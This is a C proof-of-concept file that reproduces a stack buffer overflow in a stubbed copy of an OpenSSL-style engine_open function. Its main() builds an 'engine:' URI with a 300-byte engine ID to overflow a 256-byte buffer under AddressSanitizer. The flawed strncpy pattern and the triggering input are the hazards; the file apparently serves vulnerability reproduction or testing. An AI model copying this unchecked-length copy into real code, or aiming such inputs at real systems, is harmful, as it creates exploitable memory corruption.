#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Minimal stub types to satisfy the vulnerable code */
typedef struct ENGINE_st {
    int dummy;
} ENGINE;

typedef struct OSSL_STORE_LOADER_st {
    int dummy;
} OSSL_STORE_LOADER;

typedef struct UI_METHOD_st {
    int dummy;
} UI_METHOD;

typedef struct OSSL_STORE_LOADER_CTX_st {
    ENGINE *e;
    char *keyid;
    int expected;
    int loaded;
} OSSL_STORE_LOADER_CTX;

/* OpenSSL-like helper stubs */
static void *OPENSSL_zalloc(size_t n) { return calloc(1, n); }
static void OPENSSL_free(void *p) { free(p); }
static char *OPENSSL_strdup(const char *s) { return s ? strdup(s) : NULL; }

static void ENGINE_free(ENGINE *e) { free(e); }
static ENGINE *ENGINE_by_id(const char *id) {
    /* Stub: pretend we didn't find the engine to keep things simple */
    (void)id;
    return NULL;
}

static OSSL_STORE_LOADER_CTX *OSSL_STORE_LOADER_CTX_new(ENGINE *e, char *keyid)
{
    OSSL_STORE_LOADER_CTX *ctx = (OSSL_STORE_LOADER_CTX *)OPENSSL_zalloc(sizeof(*ctx));
    if (ctx != NULL) {
        ctx->e = e;
        ctx->keyid = keyid;
    }
    return ctx;
}

static void OSSL_STORE_LOADER_CTX_free(OSSL_STORE_LOADER_CTX *ctx)
{
    if (ctx != NULL) {
        ENGINE_free(ctx->e);
        OPENSSL_free(ctx->keyid);
        OPENSSL_free(ctx);
    }
}

#define ENGINE_SCHEME_COLON "engine:"
#define CHECK_AND_SKIP_CASE_PREFIX(p, prefix) \
    (strncmp((p), (prefix), strlen(prefix)) == 0 ? ((p) += strlen(prefix), 1) : 0)

/* Vulnerable function reproduced from the target source (with minimal surrounding stubs) */
static OSSL_STORE_LOADER_CTX *engine_open(const OSSL_STORE_LOADER *loader,
    const char *uri,
    const UI_METHOD *ui_method,
    void *ui_data)
{
    const char *p = uri, *q;
    ENGINE *e = NULL;
    char *keyid = NULL;
    OSSL_STORE_LOADER_CTX *ctx = NULL;

    (void)loader;
    (void)ui_method;
    (void)ui_data;

    if (!CHECK_AND_SKIP_CASE_PREFIX(p, ENGINE_SCHEME_COLON))
        return NULL;

    /* Look for engine ID */
    q = strchr(p, ':');
    if (q != NULL /* There is both an engine ID and a key ID */
        && p[0] != ':' /* The engine ID is at least one character */
        && q[1] != '\0') { /* The key ID is at least one character */
        char engineid[256];
        size_t engineid_l = (size_t)(q - p);

        /* BUG: engineid_l may exceed sizeof(engineid)-1, causing overflow */
        strncpy(engineid, p, engineid_l);
        engineid[engineid_l] = '\0';
        e = ENGINE_by_id(engineid);

        keyid = OPENSSL_strdup(q + 1);
    }

    if (e != NULL && keyid != NULL)
        ctx = OSSL_STORE_LOADER_CTX_new(e, keyid);

    if (ctx == NULL) {
        OPENSSL_free(keyid);
        ENGINE_free(e);
    }

    return ctx;
}

int main(void)
{
    /* Craft a URI with an engine ID > 255 bytes to overflow the 256-byte buffer */
    const char *scheme = ENGINE_SCHEME_COLON; /* "engine:" */
    size_t long_id_len = 300; /* > 255 to trigger overflow */
    const char *keyid = ":K"; /* minimal non-empty key id */

    size_t uri_len = strlen(scheme) + long_id_len + strlen(keyid);
    char *uri = (char *)malloc(uri_len + 1);
    if (!uri) {
        perror("malloc");
        return 1;
    }

    /* Build: "engine:" + 300 x 'A' + ":K" */
    char *w = uri;
    memcpy(w, scheme, strlen(scheme));
    w += strlen(scheme);
    memset(w, 'A', long_id_len);
    w += long_id_len;
    memcpy(w, keyid, strlen(keyid));
    w += strlen(keyid);
    *w = '\0';

    /* Call the vulnerable function; AddressSanitizer should report stack-buffer-overflow */
    OSSL_STORE_LOADER_CTX *ctx = engine_open(NULL, uri, NULL, NULL);

    /* Cleanup (not reached if ASan aborts due to detected overflow on function epilogue) */
    OSSL_STORE_LOADER_CTX_free(ctx);
    free(uri);

    return 0;
}
